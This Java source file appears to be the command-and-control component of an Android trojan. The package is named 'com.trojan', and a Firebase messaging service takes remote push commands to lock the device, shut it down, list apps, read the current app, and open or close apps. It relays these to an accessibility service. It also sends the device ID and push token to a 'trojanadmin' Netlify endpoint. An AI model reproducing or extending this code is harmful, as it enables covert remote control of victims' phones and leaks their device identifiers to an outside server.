package com.trojan;

import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Log.d(TAG, "FCM Message From: " + remoteMessage.getFrom());

        if (remoteMessage.getData().size() > 0) {
            Map<String, String> data = remoteMessage.getData();
            Log.d(TAG, "Message data payload: " + data);

            String action = data.get("action");
            if (action == null) {
                Log.w(TAG, "No 'action' key found in FCM message data.");
                return;
            }

            Intent intent = null;
            // Use a switch for cleaner handling of multiple actions
            switch (action.toLowerCase()) {
                case "lock":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
                    break;
                case "shutdown":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
                    break;
                case "list_apps":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LIST_APPS);
                    break;
                case "get_current_app":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_CURRENT_APP);
                    break;
                case "open_app":
                    String packageToOpen = data.get("package_name");
                    if (packageToOpen != null) {
                        intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_OPEN_APP);
                        intent.putExtra("package_name", packageToOpen);
                    } else {
                        Log.w(TAG, "Action 'open_app' received without 'package_name'.");
                    }
                    break;
                case "close_app":
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_CLOSE_APP);
                    break;
                default:
                    Log.w(TAG, "Received unknown action: " + action);
            }

            if (intent != null) {
                Log.d(TAG, "Broadcasting action: " + intent.getAction());

                // ================== FIX #1: MAKE THE INTENT EXPLICIT ==================
                // On modern Android (8.0+), implicit broadcasts from background services are restricted.
                // By setting the package, we make the broadcast explicit, ensuring it is delivered
                // to our app's BroadcastReceiver in PowerAccessibilityService.
                intent.setPackage(getPackageName());
                // =======================================================================

                sendBroadcast(intent);
            }
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(TAG, "Refreshed FCM token: " + token);

        // ================== FIX #2: RE-REGISTER THE NEW TOKEN ==================
        // The FCM token can change at any time. If we don't tell our server about the
        // new token, all future commands will be sent to an old, invalid address.
        // This logic ensures the server is always updated.
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId != null && !deviceId.isEmpty()) {
            sendRegistrationToServer(deviceId, token);
        }
        // ====================================================================
    }

    /**
     * Sends the device ID and a new FCM token to your backend server.
     * This is crucial for ensuring the server always has the latest, valid token.
     * @param deviceId The unique ID of the device.
     * @param token The new FCM registration token.
     */
    private void sendRegistrationToServer(String deviceId, String token) {
        RequestQueue queue = Volley.newRequestQueue(this);
        // Ensure this URL is correct.
        String url = "https://trojanadmin.netlify.app/.netlify/functions/register-device";

        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to create JSON for token re-registration", e);
            return;
        }

        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, postData,
                response -> Log.i(TAG, "Successfully re-registered new token with server."),
                error -> Log.e(TAG, "Error re-registering new token with server: " + error.toString())
        );

        queue.add(jsonObjectRequest);
    }
}
